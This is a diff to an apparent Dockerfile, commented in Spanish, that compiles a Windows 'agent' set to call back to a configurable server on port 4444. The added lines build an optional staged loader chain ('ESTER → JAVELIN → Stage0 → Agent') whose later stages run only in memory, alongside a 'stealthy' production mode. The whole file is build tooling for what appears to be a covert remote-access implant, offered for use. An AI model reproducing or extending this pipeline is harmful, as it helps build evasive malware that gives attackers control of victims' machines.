@@ -41,6 +41,7 @@ ARG SERVER_IP=0.0.0.0
 ARG SERVER_PORT=4444
 ARG AGENT_NAME=agent
 ARG PRODUCTION_MODE=false
+ARG MULTI_STAGE=false
 
 # Script de compilación
 RUN mkdir -p /build_output
@@ -128,6 +129,24 @@ RUN echo "🔨 Compilando agente con servidor ${SERVER_IP}:${SERVER_PORT}..." &&
     cp ${AGENT_NAME}.exe /build_output/${AGENT_NAME}.exe && \
     echo "✅ Agente compilado: /build_output/${AGENT_NAME}.exe"
 
+# 9. Compilar sistema multi-stage (opcional)
+RUN if [ "$MULTI_STAGE" = "true" ]; then \
+        echo "🔨 Compilando sistema multi-stage (ESTER→JAVELIN→Stage0)..."; \
+        if [ "$PRODUCTION_MODE" = "true" ]; then \
+            /build_output/builder build-staged \
+                --server "${SERVER_IP}:${SERVER_PORT}" \
+                --production \
+                --output /build_output; \
+        else \
+            /build_output/builder build-staged \
+                --server "${SERVER_IP}:${SERVER_PORT}" \
+                --output /build_output; \
+        fi && \
+        echo "✅ Sistema multi-stage compilado: /build_output/ester.exe"; \
+    else \
+        echo "ℹ️  Multi-stage desactivado (usa --multi-stage para activar)"; \
+    fi
+
 # Crear un resumen de los binarios generados
 RUN echo "📦 RESUMEN DE COMPILACIÓN" > /build_output/BUILD_INFO.txt && \
     echo "========================" >> /build_output/BUILD_INFO.txt && \
@@ -143,6 +162,13 @@ RUN echo "📦 RESUMEN DE COMPILACIÓN" > /build_output/BUILD_INFO.txt && \
     echo "  Configurado para: ${SERVER_IP}:${SERVER_PORT}" >> /build_output/BUILD_INFO.txt && \
     echo "  Modo: $(if [ "$PRODUCTION_MODE" = "true" ]; then echo "PRODUCCIÓN (stealthy)"; else echo "DESARROLLO (debug)"; fi)" >> /build_output/BUILD_INFO.txt && \
     echo "" >> /build_output/BUILD_INFO.txt && \
+    if [ "$MULTI_STAGE" = "true" ]; then \
+        echo "Sistema Multi-Stage:" >> /build_output/BUILD_INFO.txt && \
+        ls -lh /build_output/ester.exe >> /build_output/BUILD_INFO.txt 2>/dev/null || echo "  (no compilado)" >> /build_output/BUILD_INFO.txt && \
+        echo "  Pipeline: ESTER → JAVELIN (mem) → Stage0 (mem) → Agent (mem)" >> /build_output/BUILD_INFO.txt && \
+        echo "  Configurado para: ${SERVER_IP}:${SERVER_PORT}" >> /build_output/BUILD_INFO.txt && \
+        echo "" >> /build_output/BUILD_INFO.txt; \
+    fi && \
     echo "Builder (x86_64):" >> /build_output/BUILD_INFO.txt && \
     ls -lh /build_output/builder >> /build_output/BUILD_INFO.txt && \
     echo "" >> /build_output/BUILD_INFO.txt && \
